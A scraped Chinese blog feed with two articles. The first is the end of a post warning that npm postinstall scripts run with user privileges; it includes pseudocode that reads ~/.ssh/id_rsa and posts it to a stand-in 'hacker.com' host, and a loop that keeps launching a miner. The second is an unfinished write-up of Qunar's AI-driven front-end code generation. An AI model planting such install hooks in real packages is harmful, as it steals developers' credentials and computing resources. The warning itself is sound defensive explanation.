<p>当你引入一个包时，你不仅引入了它的代码，还引入了它的 <code>package.json</code>。请看这段平平无奇的配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node scripts/setup.js"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>你看到的是一行配置，npm 看到的是：</p>
<ul>
<li>✅ <strong>允许执行代码</strong>：无需你二次确认。</li>
<li>✅ <strong>当前用户权限</strong>：如果你用 <code>sudo npm i</code>，那它就是 root 权限（危）。</li>
<li>✅ <strong>文件系统读写</strong>：可以删除文件，也可以上传文件。</li>
<li>✅ <strong>网络访问</strong>：可以偷偷把你的 <code>.env</code> 发送到远程服务器。</li>
</ul>
<h3 data-id="heading-4">🧨 为什么会把电脑干废？</h3>
<p>最常见的情况是，某个依赖包在 <code>postinstall</code> 里写了构建逻辑：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"postinstall"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npm run build"</span>
</code></pre>
<p>而这个 <code>build</code> 里可能包含了：</p>
<ul>
<li><strong>Webpack/Rollup 全量构建</strong>：几千个文件同时编译。</li>
<li><strong>图片压缩</strong>：瞬间吃满 CPU。</li>
<li><strong>WASM/C++ 编译</strong>：现场编译二进制文件。</li>
</ul>
<p>结果就是👇</p>
<blockquote>
<p>💻 <strong>CPU 100%</strong>：所有核心满载运行。
🔥 <strong>风扇起飞</strong>：温度瞬间飙升。
🧊 <strong>电脑卡死</strong>：鼠标都动不了。</p>
</blockquote>
<p>只要依赖树里有一个包触发了全量构建或编译，你的电脑就会秒变暖手宝。</p>
<hr/>
<h2 data-id="heading-5">🚨 更可怕的是黑客入侵🤖</h2>
<p>资源占用只是“物理伤害”，更可怕的是“魔法伤害”。</p>
<p>理论上，黑客可以发布一个包（或者黑进一个流行包），在 <code>install</code> 脚本里写：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 伪代码：窃取 SSH 密钥并上传</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
<span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">'https'</span>);
<span class="hljs-keyword">const</span> sshKey = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'~/.ssh/id_rsa'</span>);
https.<span class="hljs-title function_">post</span>(<span class="hljs-string">'http://hacker.com'</span>, sshKey);
</code></pre>
<p>或者更直接一点，把你电脑变成矿机：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 伪代码：无限循环占用资源</span>
<span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
  <span class="hljs-built_in">require</span>(<span class="hljs-string">'child_process'</span>).<span class="hljs-title function_">exec</span>(<span class="hljs-string">'挖矿程序.exe'</span>);
}
</code></pre>
<p>这也是为什么很多安全规范会明确说：</p>
<blockquote>
<p>❗ <strong>严禁在公司内网随意 npm install 来路不明的包。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-6">🧠 那 npm 为啥允许这么干？它不怕吗？</h2>
<p>你可能会问：<em>“这不就是个漏洞吗？官方不管管？”</em></p>
<p>这还真不是漏洞，这是 <strong>Feature</strong>。
npm 的设计理念是：<strong>“包作者需要对安装环境有控制权”</strong>。</p>
<p>这对很多场景是<strong>必须</strong>的：</p>
<ul>
<li>✅ <strong>esbuild</strong>：需要根据你的系统（Mac/Win/Linux）下载对应的二进制文件。</li>
<li>✅ <strong>puppeteer</strong>：需要下载 Chromium 浏览器内核。</li>
<li>✅ <strong>husky</strong>：需要自动配置 git hooks。</li>
<li>✅ <strong>core-js</strong>：需要根据环境配置 polyfill。</li>
</ul>
<p><strong>代价就是：你得无条件信任你安装的每一个包，以及它们依赖的成千上万个子依赖。</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[去哪儿网前端代码自动生成技术实践]]></title>    <link>https://juejin.cn/post/7594817135128477730</link>    <guid>https://juejin.cn/post/7594817135128477730</guid>    <pubDate>2026-01-14T07:59:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128477730" data-draft-id="7594576956421292058" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="去哪儿网前端代码自动生成技术实践"/> <meta itemprop="keywords" content="AI编程,前端"/> <meta itemprop="datePublished" content="2026-01-14T07:59:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="去哪儿技术沙龙"/> <meta itemprop="url" content="https://juejin.cn/user/2251436075786791"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            去哪儿网前端代码自动生成技术实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2251436075786791/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    去哪儿技术沙龙
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:59:04.000Z" title="Wed Jan 14 2026 07:59:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 AI 时代，我们重新挖掘了前端开发的提效方向，从去哪儿网的三大业务场景：机酒主流程业务、营销业务、后台服务三大业务场景，提出了 D2C 方案和基于 AI 生成后台代码的方案。</p>
<p>D2C 方案中，我们着重解决了代码的可用性，包括固定宽度、布局精准划分、代码语义化等方面进行了代码健壮性和可维护性的提升，业务需求出码率达到 36%。</p>
<p>基于 AI 生成代码的方案中，需求文档和接口 API 组成的 Prompt，依赖 GPT 生成页面渲染和业务逻辑代码，重点解决了 Prompt 的高效生成以及复杂页面代码的有效生成，业务需求代码出码率达到了 55%。</p>
<p>在不久前举办的 QCon 全球软件开发大会上，去哪儿网前端技术总监姚佳梅带来了精彩的专题演讲“去哪儿网前端代码自动生成技术实践”，围绕去哪儿网三大业务场景的前端代码生成的方案，涵盖了代码生成中的难点和解决思路、AI 的应用和业务的应用提效等，希望能给大家带来一些帮助和思考。</p>
<p><strong>内容亮点</strong></p>
<ul>
<li>
<p>设计稿生成代码在传统算法方案的基础上加入 AI 应用</p>
</li>
<li>
<p>区分 C 端和 B 端两种场景方案，覆盖业务范围更广，有实际应用效果</p>
</li>
</ul>
<p><strong>以下是演讲实录（经 InfoQ 进行不改变原意的编辑整理）。</strong></p>
<p>我将从我们的实际业务开发角度出发，探讨我们是如何利用大型模型在大前端领域实现代码生成，以提高开发效率。我目前负责的是去哪儿网国际机票的前端业务，同时也涉足低代码和营销业务领域。我的工作重点之一就是从业务角度出发，辅助前端开发提效，包括代码生成技术的应用。</p>
<p>今天，我将围绕《去哪儿网前端代码自动生成技术实践》这一主题，展开我的演讲，内容分为四个部分，首先，阐述一下我们的研发现状以及目标达成情况，接着，将分别从 C 端和 B 端的角度探讨我们的解决方案，以及在实践过程中遇到的问题。最后，将分享一下我们的未来规划。</p>
<h2 data-id="heading-0">一、研发现状和目标达成</h2>
<h3 data-id="heading-1">1、C 端和 B 端的业务场景分析</h3>
<p>我们 C 端的业务场景主要分为两大块：主流程业务和营销活动。</p>
<p>主流程业务涵盖了用户在使用我们的系统购买机票、酒店等各类产品时所接触的所有页面。这些页面的 UI 复杂度极高，开发过程中，从 UI 编写到最终验收，需要不断地调整细节，这个过程既繁琐又耗时。其次，C 端业务涉及的客户端类型多样，包括 APP 端、小程序、PC 端和 H5 等。这些不同的客户端都需要我们去适配和开发，进一步增加了工作的复杂性。</p>
<p>营销活动的页面的 UI 复杂度也很高，并且很多页面涉及到复杂交互设计，如秒杀、砍价等。在开发这些营销活动时，我们遇到的痛点主要有两个：一是时间紧迫，比如五一、十一等节日活动，节前必须上线；二是活动量巨大，尽管我们已有低代码平台来解决部分问题，但活动形式的不断更新，使得我们的开发工作量依然巨大。</p>
<p>B 端业务主要指的是我们公司内部使用的各类后台管理系统。这些页面以大量的表单和表格为特征，信息密度极高，内容丰富。随着公司业务的增长，人力资源变得紧张，大量的需求积压。因此，我们开展这项代码生成工作的首要目标是提升前端开发效率。</p>
<h3 data-id="heading-2">2、以往的工作流程</h3>
<p>在前端开发流程中，无论是 C 端还是 B 端，我们都是从需求 PRD（产品需求文档）开始的。对于 C 端，我们通常会有 UI 设计稿，这为我们的开发流程提供了视觉参考。在 C 端开发中，我们首先编写渲染代码，包括布局和样式。渲染代码的开发时间与逻辑代码的开发时间大致相当，各占一半。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af754d381bb04ab598e9226fa91edd01~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=6ZXrmyhIH4Tc5E22XxjM0GkysaA%3D" alt="" loading="lazy"/></p>
<p>B 端在大多数情况下，是依赖于需求文档和原型稿进行开发。在 B 端开发中，我们可以使用现有的 UI 框架来实现样式，因此在渲染上花费的时间会比逻辑代码少，逻辑代码的开发时间会占据更大的比例。</p>
<p>B 端在大多数情况下，是依赖于需求文档和原型稿进行开发。在 B 端开发中，我们可以使用现有的 UI 框架来实现样式，因此在渲染上花费的时间会比逻辑代码少，逻辑代码的开发时间会占据更大的比例。</p>
<h3 data-id="heading-3">3、AI 重塑后的开发流程</h3>
<p>在引入 AI 技术重塑我们的开发流程之后，我们的工作方式发生了显著变化。过去，我们是从零开始编写代码，但现在，我们首先获取必要的物料，比如 UI 设计稿和需求文档。接着，我们会进行代码生成，基于这些生成的代码，进行后续的开发工作。我们会对生成的代码进行检查，确保功能没有遗漏，并且确定是否有 AI 无法生成的部分，这些部分就需要我们进行二次开发。</p>
<p>C 端代码生成出码率是 36%，B 端的出码率达到了 55%。出码率是指需求中被应用的自动生成的代码行数占需求上线总代码行数的比例。例如，一个 C 端需求上线了 1000 行代码，其中有 360 行是智能生成的。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b732c8498f224a6da5d06711e0462ae4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=pfFjD5acM%2FH7zCv94y2CdpvjARo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">4、代码生成案例</h3>
<p>C 端以一个页面为例，这个页面包含了与后端的交互接口数据以及用户点击和不同状态的交互逻辑。如果从头开始开发，这样的页面通常需要 1 到 2 天的时间。然而，通过我们的 AI 代码生成系统，这个页面的开发可以在短短一个小时内完成。我们的系统首先要求上传 UI 设计稿。上传后，系统大约几秒就能生成渲染代码，同时提供实时预览效果。UI 设计稿在左侧展示，而右侧则是实时预览的效果。这样，我们就能直观地看到生成的渲染代码与设计稿的匹配程度。接下来，我们结合产品需求文档生成一个可交互的 Checklist，这个 Checklist 帮助我们对需求点进行详细分析，梳理成一个完善的结构，为后续的代码生成打下基础。这份 Checklist 的数据会传递给 GPT，由它来生成逻辑代码。这部分代码包括页面与后端的交互以及页面本身的交互逻辑，比如点击某个按钮后的行为，或者页面的埋点信息等，基本上页面的大部分交互逻辑都能通过 AI 生成。</p>
<p>B 端的案例页面包含了表单、表格，以及一个树形结构和搜索框，页面的另一侧是节点的详细内容。如果从头开始开发，这样的页面同样需要 1 到 2 天的时间，而我们的 AI 代码生成系统也能在一个小时内完成开发。我们在一个系统中新建页面，然后将页面的所有模块进行拆分。针对每个模块编写提示词，并将这些提示词发送给 GPT 以生成代码。这个过程支持多轮对话，如果生成的代码不够好或者有功能遗漏，我们可以继续与 GPT 对话，指导它进行修正。所有模块生成后，会跳转到我们的在线编辑页面，左侧是编辑区，右侧是实时预览区。GPT 生成的实时预览页面的初版整体可用性已经非常高，所有的操作，比如点击查询后表单的显示，以及表格的生成，都是从真实后端接口数据中获取的，而不是一个静态的页面。</p>
<h2 data-id="heading-5">二、C 端业务场景解决方案</h2>
<p>在 C 端业务场景中，我们对代码生成的要求主要有两个方面。首先，由于 UI 设计稿的样式复杂，我们需要高还原度的代码以确保代码的可用性。其次，考虑到主流程业务的更新迭代，我们对生成的代码质量有较高要求。为了进一步提升效率，我们还希望生成业务和交互逻辑代码。</p>
<p>在技术方案选型上，我们首先考虑了从设计稿到渲染代码的 D2C 方案。业界已经有很多成熟且优秀的 D2C 方案，我们进行了调研和试验，这些方案的 UI 还原度普遍在 90% 以上。然而，仅仅有高还原度是不够的，我们还需要考虑到代码的布局合理性、避免固定宽度以及语义化等问题。这些代码在简单图文场景下或许足够，但对于需要后续更新迭代的主流程代码来说还不能满足需求。此外，大多数优秀产品不开源，这意味着我们无法基于它们进行优化。</p>
<p>考虑到 AI 技术的流行趋势，我们也探索了现有的大模型是否能够从设计稿生成高 UI 还原度的代码。我们尝试了多个案例，并不断优化提示词，但效果大同小异。在对 UI 还原度要求极高的场景下，仅提供设计稿生成的效果往往达不到我们的要求，许多细节模块可能缺失。同时，在业务需求上线前，我们缺乏对 UI 稿有效的脱敏手段，无法将其直接提供给外部。</p>
<p>我们进行了其他方向的探索。一方面，我们针对 D2C 方案中语义化不足的问题，在大模型中进行了尝试，效果非常好。另一方面，我们利用大模型对自然语言处理的优势，根据文字描述生成交互逻辑代码。最终，我们选择了一个综合方案：自研一套 D2C 方案，重点解决布局不合理、固定宽度等问题，并结合 AI 优化渲染代码，同时利用 AI 根据需求文档生成逻辑代码。这样的方案既满足了我们对 UI 还原度和代码质量的要求，也提高了开发效率，并且能够适应后续需求的更新迭代。</p>
<h3 data-id="heading-6">1、系统架构</h3>
<p>我们的代码生成架构是一个自上而下的流程，它包括用户输入、中间生成、以及最终的目标代码输出。用户输入部分，我们目前支持 Sketch 和 Figma 这两种 UI 设计软件的稿件，以及需求产品文档。</p>
<p>从用户输入的 UI 稿件到中间的 D2C 描述及渲染代码的生成，整个过程是一个典型的 D2C 转换。我们首先获取 UI 稿件，然后对其中大量的图层数据进行解析，生成我们所需的 DSL 结构。在这个结构基础上，我们进行布局和样式的生成，最终得到包含布局和样式的 DSL。之后，我们将这个 DSL 翻译成目标代码，目前我们支持的目标代码包括 React Native、Shark（自研的跨端营销活动框架）、Taro 以及 ArkUI。在获得渲染代码之后，我们利用 GPT 进行语义化处理，以及代码组件的拆分和列表数据的循环。完成这些步骤后，我们再结合需求 PRD 和本地 SDK 代码库依赖 GPT 进行逻辑代码的生成。所有代码生成完毕后，开发会进入检查和补充开发环节。需求经过测试上线后，就会触发出码率的自动计算。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c9114ff7737452ca1e7a186916dc0b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=ELMNCVE8O5G6wgNfloO4wG5QJko%3D" alt="" loading="lazy"/></p>
<p>本次分享，我将重点介绍 D2C 过程中遇到的难点以及解决方案，同时展示 AI 如何提升代码质量，如何实现从 PRD 到代码的转换。</p>
<h2 data-id="heading-7">三、D2C 难点与解决方案</h2>
<p>在 D2C 的过程中，我们遇到了以下几个难点：</p>
<ol>
<li>
<p>布局切割不合理。例如，当前这个例子我们期望的布局是 5 组，其中图片和标题应该是一组，并且能够用 list 数据循环渲染出来。但是 D2C 可能将它们分割成不同的部分，图片和文字被分离，或者因为宽度和间距的原因，图片被分成两组。这样的结构对于前端开发来说是不可接受的。</p>
</li>
<li>
<p>大量的 Absolute 定位问题。由于图层交叉，D2C 可能会产生大量的绝对定位，这会导致后续布局难以编写。</p>
</li>
<li>
<p>固定宽度问题也是一个挑战。D2C 生成的模块是固定宽度，这在不同分辨率的屏幕上可能会导致内容被截断或者铺满整个屏幕。</p>
</li>
<li>
<p>Class 类名不语义化的问题。D2C 算法生成的类名，如 view0、view1、view2、text0、text1 等，缺乏有效含义。</p>
</li>
</ol>
<p>针对这些问题，我们采取了以下解决方案：</p>
<h3 data-id="heading-8">1、布局切割优化</h3>
<p>我们使用了业界常用的投影算法，依据侧投影进行水平和垂直两个方向的切割。结合投影算法和一些算法规则，解决了大部分的布局切割不正确的问题。下面主要讲解三类应用最多的算法和方法：</p>
<p><strong>1、间距聚类</strong>，我们引入了 K-Means 聚类算法，在这个例子中，将水平切割产生的模块的间距作为输入值，输出不被切开的间距，从而保持图片和文本作为一个整体。</p>
<p><strong>2、切割方向的选择</strong>：我们采用了轴向布局验证算法，选择切割方向的交叉轴方向，查看所有节点的对齐方式是否一致，选择不对齐节点数最少的方向进行切割。</p>
<p><strong>3、识别组件辅助精准进行切割</strong>，我们识别出实际的组件，进行布局的合理生成。例如在这个例子中，我们识别出 Toast 组件并将其移除，然后针对剩余的组件进行是否为列表的识别。识别为列表的判断依据包含：从 DSL 判断子元素的相似度、是否等距以及面积是否相等。如果识别为列表，直接按照列表生成布局。</p>
<h3 data-id="heading-9">2、Absolute 布局的优化</h3>
<p>在 Absolute 布局的优化时，我们面对的主要问题是图层交叉导致的绝对布局问题。我们分析三个典型的案例，并为每个案例制定了相应的解决方案。</p>
<ol>
<li>
<p><strong>紧凑文本</strong>。从视觉上看，设计稿中的文本并不交叉，但如果我们查看图层的实际高度，就会发现存在细微的交叉。如果整个页面都使用 Absolute 布局，代码的健壮性会非常差，稍微长一点的字段就会遮盖后面的内容。针对这种情况，我们的处理方式是调整行高，使得文本从交叉变为不交叉，从而能够正常地进行布局切割。在完成正常布局后，再在属性上还原行高。</p>
</li>
<li>
<p><strong>去除干扰元素。</strong> 例如，一个浮标组件本身使用 Absolute 布局是没有问题的，但由于图层交叉，使得下面的元素也变成了 Absolute 布局，这影响了我们的代码。在这种情况下，我们会先移除浮标，让下面的元素正常参与布局，然后再以 Absolute 布局将其还原回来。</p>
</li>
<li>
<p><strong>背景交叉问题</strong>。这个例子中，由于背景图层是渐变色，与下面的入住信息模块产生了交叉。我们通过拉伸背景图，将其从交叉关系转变为父子关系，这样就能进行正常布局计算。</p>
</li>
</ol>
<h3 data-id="heading-10">3、固定宽度的优化</h3>
<p>在前端开发中，固定宽度的问题常常导致兼容性问题，尤其是在不同分辨率的屏幕上。如果给元素设置了固定宽度，实际业务数据中的几个额外字符可能会导致内容换行或挤压旁边的元素。即使我们生成了代码，这种固定宽度的问题也可能使得代码无法使用，进而影响我们的出码率。</p>
<p>为了解决固定宽度的问题，我们采用了弹性布局的方法。原本的布局生成依赖于元素宽度固定值和 Margin 来维持元素间的间距，但这并不是我们想要的结果，因为实际开发中我们不希望有过多的 Margin 或元素宽度固定值。因此，我们结合元素本身的信息、它与兄弟节点和父节点的位置关系，计算在 Flex 布局下应该使用的属性。也会根据一些条件判断元素的宽度是否确实需要保留。</p>
<p>我们也对算法生成的样式代码进行了优化，包括提取公共样式和删除冗余样式，以减少代码中的重复和冗余。</p>
<h2 data-id="heading-11">四、AI 辅助代码优化</h2>
<p>在拿到渲染代码后，我们利用 GPT 进行了一系列 AI 辅助的代码优化。这些优化主要包括两个部分：语义化和代码结构优化。</p>
<h3 data-id="heading-12">1、语义化优化</h3>
<p>在编写 class name 时，开发者通常会选择像 main-container、ticket-section 这样具有描述性的名称。而 D2C 算法生成的可能是 view008 这样的无意义标识符。GPT 帮助我们将这些无意义的标识符转换成更易于理解和接受的语义化名称。实现这一过程，我们输入了一个简化的 DSL，并通过编写提示词让 GPT 生成新旧类名的映射。在获得新的类名后，我们会进行校验，确保没有重名或遗漏处理的类名，然后将这些回填到渲染代码中。最终的语义化结果比较符合开发者命名习惯。</p>
<h3 data-id="heading-13">2、AI 代码结构优化</h3>
<p>D2C 生成的代码在实际应用中还需要进一步的组件拆分。例如，一段代码可能需要被拆分成一个 Tab 组件和一个列表循环。GPT 在这方面也提供了帮助，它不仅帮助我们进行组件拆分，还识别出了列表（list）和列表项（list item）。GPT 生成的代码能够根据 map 数据结构直接进行循环，并将业务数据与后端数据结合填充进去。与原始代码相比，GPT 优化后的代码整体可用性大大提高。</p>
<h3 data-id="heading-14">3、UI 还原度 DIFF 工具</h3>
<p>我们开发了一个 UI 还原度 DIFF 工具，旨在帮助开发人员更高效地检查和修正代码的 UI 还原度。这个工具的推出基于两个主要考虑：首先，开发人员需要一个方法来验证我们的 UI 还原度是否达到了预期；其次，由于生成的代码并非 100% 还原，开发人员在需要进行修正时，手动比对会非常耗时。这个 DIFF 工具提供了一个整体的还原度数值，这个数值是基于像素维度的对比得出的。此外，工具中还有一条可以拖拉的线条，通过拖动这条线，我们可以看到重影部分，这些重影是我们生成的渲染效果与 UI 设计稿效果的叠加。通过观察这些重影，我们可以判断出哪些元素没有对齐。点击这些元素后，开发人员可以精确地知道每个元素偏差了多少像素，宽度少了多少像素，这样也可能快速对样式进行修正。</p>
<h2 data-id="heading-15">五、P2C：逻辑代码生成</h2>
<p>在渲染代码生成之后，我们需要让这份代码具有交互性和逻辑性，使其能够动态地响应用户操作。这就是我们的 P2C（PRD to Code）部分所要解决的问题。让我们来看一下整体的生成流程。</p>
<p>首先，页面的所有交互行为和业务逻辑都源自于需求 PRD。我们首先对 PRD 进行解析，然后利用 GPT 梳理优化生成一份结构化的数据后，导入到 Checklist 中。这份 Checklist 数据将在本地知识库代码中检索出会用到的代码 SDK。结合刚刚生成的渲染代码以及接口数据，构建整个 prompt，进行数据脱敏后，让 GPT 进行代码生成。</p>
<p>在整个过程中，我们分析了两个主要的难点。第一个难点是如何有效地处理需求 PRD，提取信息并将其结构化。PRD 的功能描述是否完整是一个挑战。第二个难点是如何从需求 PRD 匹配到现有的私有代码库的 SDK。由于 SDK 数量众多，可能多达几百个，如果全部提供给 GPT，将会造成 token 的大量浪费。SDK 举例：登录校验、接口调用封装、分享、埋点等。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1b3c9e5b05644b89a1372db5c2956b02~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y675ZOq5YS_5oqA5pyv5rKZ6b6Z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768982344&amp;x-signature=za2MHDx7%2BBf5ruKJCUT%2Fs3g6Ras%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">1、需求 PRD 生成 Checklist</h3>
<p>我们的需求 PRD 生成 Checklist 的过程开始于 Wiki 平台，我们会读取 Wiki 上的文档，从上到下解析整个文档，提取出我们需要的内容。由于我们的需求 PRD 遵循一定的格式，我们可以准确地提取出所需的部分。提取出来后，我们会将其格式化为我们自己制定的格式，并进行数据脱敏。</p>
<p>接下来，我们需要编写 prompt，引导 GPT 产出一份 Checklist 所需的数据。这个 prompt 过程实际上也是一个 COT 过程，我们要求 GPT 进行步骤拆解，构造出多层级结构，并确保每个步骤都是独立且完整的。根据我们的需求，GPT 会生成包含模块名、case 名、步骤和结果的格式化数据。</p>
<p>得到的这份结构化数据随后被输入到我们的 Checklist 系统中，生成一个可交互的结构。这个可交互的结构允许开发人员手动进行修正，比如通过拖拽调整条目的位置，或者编辑补充缺失的内容。这个界面的设计是为了提高后续代码生成的准确性，而且这份 Checklist 也能用于后续的测试用例生成。</p>
<h3 data-id="heading-17">2、SDK 动态匹配</h3>
<p>这里是 RAG 的应用，它主要分为三个核心部分。</p>
